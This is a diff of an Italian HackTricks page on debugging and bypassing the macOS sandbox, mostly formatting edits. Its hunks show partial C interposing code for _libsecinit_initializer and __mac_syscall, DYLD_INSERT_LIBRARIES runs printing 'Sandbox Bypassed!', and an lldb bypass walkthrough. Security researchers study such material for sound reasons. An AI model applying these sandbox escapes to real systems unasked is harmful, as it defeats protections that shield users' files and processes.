@@ -1,4 +1,4 @@
-# Debug e Bypass del Sandbox di macOS
+# macOS Sandbox Debug & Bypass
 
 <details>
 
@@ -9,7 +9,7 @@ Altri modi per supportare HackTricks:
 * Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
 * Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
@@ -77,18 +77,21 @@ Se dal processo sandbox sei in grado di **compromettere altri processi** in esec
 [**Questa ricerca**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) ha scoperto 2 modi per eludere il Sandbox. Poiché il sandbox viene applicato da userland quando viene caricata la libreria **libSystem**. Se un binario potesse evitare di caricarla, non verrebbe mai messo in sandbox:
 
 * Se il binario fosse **completamente compilato staticamente**, potrebbe evitare di caricare quella libreria.
-* Se il **binario non avesse bisogno di caricare alcuna libreria** (perché il linker è anche in libSystem), non avrebbe bisogno di caricare libSystem.&#x20;
+* Se il **binario non avesse bisogno di caricare alcuna libreria** (perché il linker è anche in libSystem), non avrebbe bisogno di caricare libSystem.
 
 ### Shellcode
 
 Nota che **anche gli shellcode** in ARM64 devono essere collegati a `libSystem.dylib`:
+
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
+
 ### Entitlements
 
 Si noti che anche se alcune **azioni** potrebbero essere **consentite dalla sandbox**, se un'applicazione ha un **entitlement** specifico, come ad esempio:
+
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -98,15 +101,17 @@ Si noti che anche se alcune **azioni** potrebbero essere **consentite dalla sand
 (global-name "com.apple.cfnetwork.cfnetworkagent")
 [...]
 ```
+
 ### Bypass di Interposting
 
 Per ulteriori informazioni su **Interposting**, consulta:
 
-{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
-[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
+{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
+[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
 {% endcontent-ref %}
 
 #### Interpost `_libsecinit_initializer` per evitare la sandbox
+
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -130,6 +135,7 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
+
 #### Interpost `__mac_syscall` per evitare il Sandbox
 
 {% code title="interpose.c" %}
@@ -165,6 +171,7 @@ __attribute__((used)) static const struct interpose_sym interposers[] __attribut
 };
 ```
 {% endcode %}
+
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 
@@ -176,18 +183,21 @@ __mac_syscall invoked. Policy: Quarantine, Call: 87
 __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
+
 ### Debug e bypassare il Sandbox con lldb
 
 Compiliamo un'applicazione che dovrebbe essere sandboxata:
 
 {% tabs %}
-{% tab title="sand.c" %}
+{% tab title="undefined" %}
 ```c
 #include <stdlib.h>
 int main() {
 system("cat ~/Desktop/del.txt");
 }
 ```
+{% endtab %}
+
 {% tab title="entitlements.xml" %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -197,7 +207,6 @@ system("cat ~/Desktop/del.txt");
 </dict>
 </plist>
 ```
-{% tab title="Info.plist" %}
 
 Il file Info.plist è un file di configurazione utilizzato per definire le informazioni di un'applicazione macOS. Contiene metadati come il nome dell'applicazione, l'identificatore del pacchetto, le autorizzazioni richieste e altre impostazioni specifiche dell'applicazione. Questo file è essenziale per il corretto funzionamento dell'applicazione e viene utilizzato anche per definire le restrizioni di sicurezza imposte dal sandbox di macOS.
 
@@ -209,7 +218,6 @@ La modifica del file Info.plist può consentire di bypassare alcune restrizioni 
 
 Per modificare il file Info.plist, è possibile utilizzare un editor di testo o uno strumento di modifica XML. È consigliabile eseguire il backup del file originale prima di apportare modifiche e testare attentamente l'applicazione dopo la modifica per garantire che funzioni correttamente e che le restrizioni del sandbox siano ancora applicate correttamente.
 
-{% endtab %}
 ```xml
 <plist version="1.0">
 <dict>
@@ -240,12 +248,14 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 {% hint style="danger" %}
 L'applicazione cercherà di **leggere** il file **`~/Desktop/del.txt`**, che la **Sandbox non permetterà**.\
 Crea un file lì perché una volta che la Sandbox viene bypassata, sarà in grado di leggerlo:
+
 ```bash
 echo "Sandbox Bypassed" > ~/Desktop/del.txt
 ```
 {% endhint %}
 
 Eseguiamo il debug dell'applicazione per vedere quando viene caricato il Sandbox:
+
 ```bash
 # Load app in debugging
 lldb ./sand
@@ -322,6 +332,7 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
+
 {% hint style="warning" %}
 **Anche se il Sandbox è bypassato, TCC** chiederà all'utente se vuole consentire al processo di leggere i file dal desktop.
 {% endhint %}
@@ -341,7 +352,7 @@ Altri modi per supportare HackTricks:
 * Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
 * Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
